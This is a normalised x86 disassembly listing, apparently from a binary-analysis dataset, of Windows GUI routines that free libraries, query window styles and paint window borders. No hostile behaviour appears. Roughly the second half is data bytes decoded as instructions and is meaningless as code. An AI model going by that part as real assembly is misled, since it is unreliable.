pop ecx
mov [ fs : eax ] edx
push sub_43a7aa
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a0c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a9fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42e508
mov [ esi + 0x5 ] al
call sub_43a6d4
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43b374
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_43aa48
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_43aae8
call sub_42e348
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_43aa7c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43aae8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ab2c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43aa7c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ab7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43aa7c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43abc8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43aa7c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ac0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43aa7c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43ac54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43aa7c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43acbc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_40481c
push eax
mov eax esi
call sub_40480c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43aa7c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43ad20
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43ada4
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43ade0
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43ae7c
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43ae99 ]
jmp [ eax * 4 + jump_table_43af02 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43b208
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43b363
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43ada4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43abc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41919c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43b390
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43b3cb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b3d2
retn
mov eax [ rw-data ]
call sub_403254
mov eax rw-data
call sub_403fa4
sub_43cb14
push es
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] eax
add [ eax ] al
and eax 0x61500b00
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
dec ebp
inc esp
add [ ecx + ecx + 0x45 ] dh
ja r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
push eax
popad
jb r-xdata
outsb
je r-xdata
in al 0x7c
inc ecx
jb r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
outsb
je r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
in al 0xa0
inc esp
add [ ecx ] al
add [ eax ] al
xor eax [ eax + eax + 0x10 ]
dec [ edx + ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add [ eax ] cl
push ebx
inc ebx
push 0x95ec7261
push 0x6948776f
outsb
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
adc [ eax ] al
push cs
add al [ eax ]
[ edi + eax ]
push 0x6948776f
outsb
je r-xdata
inc eax
add [ edi ] dl
add bh bh
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xe4656c62
jl r-xdata
dec ebp
inc esp
add [ eax - 0x17ffbb61 ] bh
lahf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
je r-xdata
outsb
jne r-xdata
push eax
popad
jb r-xdata
adc [ eax ] al
0x2cff0000 0x44a1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
add [ eax ] al
sub [ eax ] al
adc [ eax ] al
or eax 0xa4ff0002
push es
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul eax [ esi + edx * 2 ] 0x44
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
in al 0x7c
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add ah dh
inc ebp
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
jo r-xdata
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f070037 ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
inc eax
add [ eax ] eax
jl r-xdata
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
push ecx
dec ebx
jns r-xdata
in al 0x7c
inc ecx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push cs
dec edi
jl r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
jns r-xdata
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
popad
inc esp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + ecx * 8 + 0x73060043 ] bl
dec edi
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
mov eax 0xe800444f
loopne r-xdata
jo r-xdata
jb r-xdata
inc esp
dec edi
dec edi
inc esp
add al bl
add [ eax ] al
add al 0x50
inc esp
add al ah
add [ eax ] eax
jmp eax
jl r-xdata
jo r-xdata
je r-xdata
add al 0x52
push edi
outsd
outsb
or al 0x73
jae r-xdata
jb r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
dec esi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
add al al
add [ eax ] eax
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
push eax
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
jb r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
jb r-xdata
arpl [ eax ] ax
ja r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc esp
jb r-xdata
jae r-xdata
push ebp
jo r-xdata
inc esp
add al bl
add [ eax ] eax
add [ eax ] eax
dec edi
inc esp
add al ch
outsb
push ebx
je r-xdata
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
inc esp
outsd
ja r-xdata
add [ edi + ecx * 4 ] bl
inc esp
add [ eax - 0x37ffbdf8 ] cl
pop [ eax + eax - 0x28 ]
pop es
inc edx
add [ eax + ecx + 0x42 ] ch
add al al
or [ edx ] al
or [ esi + 0xe680044 ] cl
inc esp
add [ esi + ecx * 4 + 0x44 ] bh
add [ esi ] ch
inc ebp
add [ esp + eax * 8 - 0x700bffbc ] bh
inc esp
add [ eax + 0x7c00448e ] dh
inc bp
jb r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
outsd
jb r-xdata
outsb
add [ 0x74617453 ] al
andps xmm1 [ gs : edi + 0x77 ]
jpe r-xdata
add [ eax ] al
add [ eax + 0x5a ] dh
jb r-xdata
je r-xdata
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
insd
lea eax [ bx + si ]
mov al [ 0x30043cf ]
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
push esp
popfd
inc esp
add [ edi + eax + 0x42 ] cl
je r-xdata
clc
pushad
inc eax
ja r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
push esp
dec edi
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c0043d1 ] al
dec ecx
je r-xdata
jae r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
inc ebp
jbe r-xdata
insd
add [ eax + ecx + 0x42 ] dl
in al dx
insb
add [ 0x65646e49 ] al
js r-xdata
dec ebp
popad
outsb
je r-xdata
insb
or dh [ ebx + 0x73 ]
push esi
jb r-xdata
jb r-xdata
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ edi + ecx ] al
inc esp
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
inc esp
add [ eax + 0x4c00449d ] ah
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xd1e0c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
rol [ ebx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xd2
inc ebx
add dl cl
rol [ ebx ] cl
or al 0x2
add [ eax ] al
inc esp
pop ebp
inc esp
add [ edi + eax ] dh
je r-xdata
add [ eax ] cl
xor al [ eax ]
and [ eax ] cl
inc edx
add [ esi + ecx + 0x44 ] al
jb r-xdata
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43d104c0 ] cl
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
clc
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
je r-xdata
inc esp
outsd
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al dl
cmove eax [ eax ]
hlt
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
jb r-xdata
je r-xdata
add [ eax - 0x17ffba9a ] dl
mov es [ eax + eax - 0x48 ]
inc bp
add [ edi + ecx * 4 + 0x44 ] al
add [ eax + 0x6400440e ] ah
pop [ eax + eax - 0x38 ]
inc bp
add ah al
les eax [ eax + eax + 0x58 ]
nop
inc esp
add [ eax - 0x7bffbb70 ] bl
pop [ eax + eax - 0x24 ]
inc bp
add al ah
inc bp
add [ eax + 0x1800448f ] ch
lea eax [ eax + eax + 0x11 ]
push esp
inc edx
jne r-xdata
mov al 0x8e
inc esp
add [ esi + 0x45 ] bh
inc esp
add [ esp + esi + 0x34a80040 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x31ec0040 ] ah
add [ eax ] al
adc cl 0x43
add [ eax + eax ] ch
add [ eax ] al
jo r-xdata
outsb
je r-xdata
jb r-xdata
pushad
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] ch
add al bh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc ebx
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
pop es
inc edx
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
add al 0xd1
inc ebx
add ecx [ eax ]
